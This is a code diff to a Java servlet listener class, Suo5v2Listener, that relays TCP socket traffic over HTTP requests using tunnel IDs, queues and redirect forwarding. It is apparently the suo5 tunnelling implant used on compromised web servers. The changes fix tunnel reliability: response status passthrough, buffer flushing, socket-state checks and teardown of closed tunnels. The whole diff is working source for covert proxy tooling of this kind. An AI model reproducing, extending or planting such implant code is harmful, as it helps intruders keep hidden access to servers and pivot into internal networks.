@@ -240,7 +240,8 @@ public class Suo5v2Listener implements ServletRequestListener, Runnable, Hostnam
                 baos.write(bodyContent);
                 byte[] newBody = baos.toByteArray();
                 conn = redirect(req, new String(redirectData), newBody);
-                pipeStream(conn.getInputStream(), resp.getOutputStream(), false);
+                resp.setStatus(conn.getResponseCode());
+                pipeStream(conn.getInputStream(), resp.getOutputStream(), resp, false);
             } finally {
                 if (conn != null) {
                     conn.disconnect();
@@ -336,10 +337,13 @@ public class Suo5v2Listener implements ServletRequestListener, Runnable, Hostnam
 
         Thread t = null;
         boolean sendClose = true;
+        OutputStream scOutStream = null;
+        InputStream scInStream = null;
+        OutputStream respOutputStream = null;
         try {
-            final OutputStream scOutStream = socket.getOutputStream();
-            final InputStream scInStream = socket.getInputStream();
-            final OutputStream respOutputStream = resp.getOutputStream();
+            scOutStream = socket.getOutputStream();
+            scInStream = socket.getInputStream();
+            respOutputStream = resp.getOutputStream();
 
             Suo5v2Listener p = new Suo5v2Listener(scInStream, respOutputStream, tunId);
             t = new Thread(p);
@@ -530,8 +534,8 @@ public class Suo5v2Listener implements ServletRequestListener, Runnable, Hostnam
             throw new IOException("tunnel not found");
         }
         SocketChannel sc = (SocketChannel) objs[0];
-        if (!sc.isConnected()) {
-            throw new IOException("socket not connected");
+        if (!sc.isOpen()) {
+            return;
         }
 
         byte[] data = (byte[]) dataMap.get("dt");
@@ -554,9 +558,6 @@ public class Suo5v2Listener implements ServletRequestListener, Runnable, Hostnam
             throw new IOException("tunnel not found");
         }
         SocketChannel sc = (SocketChannel) objs[0];
-        if (!sc.isConnected()) {
-            throw new IOException("socket not connected");
-        }
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         BlockingQueue<byte[]> readQueue = (BlockingQueue<byte[]>) objs[1];
         int maxSize = 512 * 1024; // 1MB
@@ -572,6 +573,10 @@ public class Suo5v2Listener implements ServletRequestListener, Runnable, Hostnam
             } else {
                 break; // no more data
             }
+        }
+        if (!sc.isOpen() && readQueue.isEmpty()) {
+            performDelete(tunId);
+            baos.write(marshalBase64(newDel(tunId)));
         }
         return baos.toByteArray();
     }
@@ -601,7 +606,7 @@ public class Suo5v2Listener implements ServletRequestListener, Runnable, Hostnam
         return port;
     }
 
-    private void pipeStream(InputStream inputStream, OutputStream outputStream, boolean needMarshal) throws Exception {
+    private void pipeStream(InputStream inputStream, OutputStream outputStream, HttpServletResponse resp, boolean needMarshal) throws Exception {
         try {
             byte[] readBuf = new byte[1024 * 8];
             while (true) {
@@ -615,6 +620,7 @@ public class Suo5v2Listener implements ServletRequestListener, Runnable, Hostnam
                 }
                 outputStream.write(dataTmp);
                 outputStream.flush();
+                if (resp != null) { resp.flushBuffer(); }
             }
         } finally {
             // don't close outputStream
@@ -1022,7 +1028,7 @@ public class Suo5v2Listener implements ServletRequestListener, Runnable, Hostnam
         // full stream
         if (this.mode == 0) {
             try {
-                pipeStream(gInStream, gOutStream, true);
+                pipeStream(gInStream, gOutStream, null, true);
             } catch (Exception ignore) {
             }
             return;
@@ -1056,8 +1062,15 @@ public class Suo5v2Listener implements ServletRequestListener, Runnable, Hostnam
                 // write thread
                 while (true) {
                     byte[] data = writeQueue.poll(300, TimeUnit.SECONDS);
-                    if (data == null || data.length == 0) {
+                    if (data == null) {
                         selfClean = true;
+                        break;
+                    }
+                    if (data.length == 0) {
+                        byte[] signal = writeQueue.poll(10, TimeUnit.SECONDS);
+                        if (signal == null) {
+                            selfClean = true;
+                        }
                         break;
                     }
                     ByteBuffer buf = ByteBuffer.wrap(data);
@@ -1071,8 +1084,8 @@ public class Suo5v2Listener implements ServletRequestListener, Runnable, Hostnam
             if (selfClean) {
 
                 removeKey(this.gtunId);
+                readQueue.clear();
             }
-            readQueue.clear();
             writeQueue.clear();
             try {
                 writeQueue.put(new byte[0]);
